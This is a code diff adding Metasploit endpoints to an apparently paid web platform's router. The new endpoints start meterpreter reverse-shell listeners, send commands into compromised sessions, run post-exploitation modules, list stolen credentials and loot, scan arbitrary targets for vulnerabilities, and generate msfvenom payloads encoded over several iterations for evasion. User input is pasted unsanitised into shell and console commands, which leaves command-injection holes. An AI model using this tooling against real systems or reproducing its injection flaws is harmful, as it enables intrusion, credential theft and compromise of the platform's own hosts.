@@ -619,12 +619,34 @@ export const metasploitRouter = router({
     return { raw: out, workspaces };
   }),
 
+  createWorkspace: protectedProcedure
+    .input(z.object({ name: z.string().min(1) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      const out = await execMsfCommand(node, `workspace -a ${input.name}`, 15000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
+  switchWorkspace: protectedProcedure
+    .input(z.object({ name: z.string().min(1) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      const out = await execMsfCommand(node, `workspace ${input.name}`, 15000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
   listHosts: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-    const out = await execMsfCommand(node, "msfconsole -q -x 'hosts; exit' 2>&1", 20000, ctx.user.id);
+    const out = await execMsfCommand(node, "hosts", 20000, ctx.user.id);
     return { output: out };
   }),
 
@@ -633,7 +655,7 @@ export const metasploitRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-    const out = await execMsfCommand(node, "msfconsole -q -x 'services; exit' 2>&1", 20000, ctx.user.id);
+    const out = await execMsfCommand(node, "services", 20000, ctx.user.id);
     return { output: out };
   }),
 
@@ -642,7 +664,152 @@ export const metasploitRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-    const out = await execMsfCommand(node, "msfconsole -q -x 'vulns; exit' 2>&1", 20000, ctx.user.id);
+    const out = await execMsfCommand(node, "vulns", 20000, ctx.user.id);
     return { output: out };
   }),
+
+  listLoot: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execMsfCommand(node, "loot", 20000, ctx.user.id);
+    return { output: out };
+  }),
+
+  listCreds: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execMsfCommand(node, "creds", 20000, ctx.user.id);
+    return { output: out };
+  }),
+
+  dbNmap: protectedProcedure
+    .input(z.object({
+      target: z.string().min(1),
+      flags: z.string().optional().default("-sV -sC -O --script=vuln"),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `db_nmap: ${input.target}`); } catch {}
+      const out = await execMsfCommand(node, `db_nmap ${input.flags} ${input.target}`, 180000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
+  startListener: protectedProcedure
+    .input(z.object({
+      lhost: z.string().min(1),
+      lport: z.number().min(1).max(65535),
+      listenerPayload: z.string().default("windows/meterpreter/reverse_tcp"),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `Start listener: ${input.lhost}:${input.lport}`); } catch {}
+      const cmd = `use exploit/multi/handler\nset PAYLOAD ${input.listenerPayload}\nset LHOST ${input.lhost}\nset LPORT ${input.lport}\nset ExitOnSession false\nexploit -j -z`;
+      const out = await execMsfCommand(node, cmd, 30000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
+  sessionInteract: protectedProcedure
+    .input(z.object({
+      sessionId: z.union([z.string(), z.number()]).transform(v => String(v)),
+      command: z.string().min(1),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `Session interact: ${input.sessionId}`); } catch {}
+      const cmd = `sessions -i ${input.sessionId}\n${input.command}`;
+      const out = await execMsfCommand(node, cmd, 60000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
+  runPost: protectedProcedure
+    .input(z.object({
+      module: z.string().min(1),
+      sessionId: z.union([z.string(), z.number()]).transform(v => String(v)),
+      options: z.record(z.string(), z.unknown()).optional(),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `Post module: ${input.module}`); } catch {}
+      const setOpts = Object.entries(input.options ?? {}).map(([k, v]) => `set ${k} ${v}`).join('\n');
+      const cmd = `use ${input.module}\nset SESSION ${input.sessionId}\n${setOpts}\nrun`;
+      const out = await execMsfCommand(node, cmd, 120000, ctx.user.id);
+      return { success: true, output: out };
+    }),
+
+  generatePayloadObfuscated: protectedProcedure
+    .input(z.object({
+      payload: z.string(),
+      lhost: z.string(),
+      lport: z.number(),
+      format: z.string().default("exe"),
+      encoder: z.string().optional().default("x86/shikata_ga_nai"),
+      iterations: z.number().min(1).max(20).optional().default(5),
+      badchars: z.string().optional(),
+      platform: z.string().optional().default("windows"),
+      arch: z.string().optional().default("x86"),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `Obfuscated payload: ${input.payload}`); } catch {}
+      const outputFile = `/tmp/payload_obf_${Date.now()}.${input.format}`;
+      const encoderFlag = input.encoder ? `-e ${input.encoder} -i ${input.iterations}` : '';
+      const badcharsFlag = input.badchars ? `-b '${input.badchars}'` : '';
+      const cmd = `msfvenom -p '${input.payload}' LHOST='${input.lhost}' LPORT=${input.lport} -f '${input.format}' ${encoderFlag} ${badcharsFlag} --platform ${input.platform} -a ${input.arch} -o '${outputFile}' 2>&1 && echo OUTPUT_FILE:${outputFile} && ls -lh ${outputFile}`;
+      const out = await execSSHCommand(nodeToSSH(node), cmd, 120000, ctx.user.id);
+      return { success: true, output: out, outputFile };
+    }),
+
+  runAutoExploit: protectedProcedure
+    .input(z.object({
+      target: z.string().min(1),
+      lhost: z.string().min(1),
+      lport: z.number().min(1).max(65535).default(4444),
+    }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      try { await consumeCredits(ctx.user.id, "metasploit_action", `AutoExploit: ${input.target}`); } catch {}
+      const cmd = [
+        `db_nmap -sV --script=vuln ${input.target}`,
+        `vulns`,
+        `services`,
+      ].join('\n');
+      const out = await execMsfCommand(node, cmd, 300000, ctx.user.id);
+      return { success: true, output: out, target: input.target };
+    }),
+
+  exportReport: protectedProcedure
+    .input(z.object({ format: z.enum(["xml", "html", "pdf", "csv"]).default("xml") }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Metasploit");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      const outFile = `/tmp/msf_report_${Date.now()}.${input.format}`;
+      const cmd = `db_export -f ${input.format} ${outFile} && echo EXPORT_OK:${outFile}`;
+      const out = await execMsfCommand(node, cmd, 60000, ctx.user.id);
+      return { success: out.includes("EXPORT_OK"), output: out, file: outFile };
+    }),
 });
+
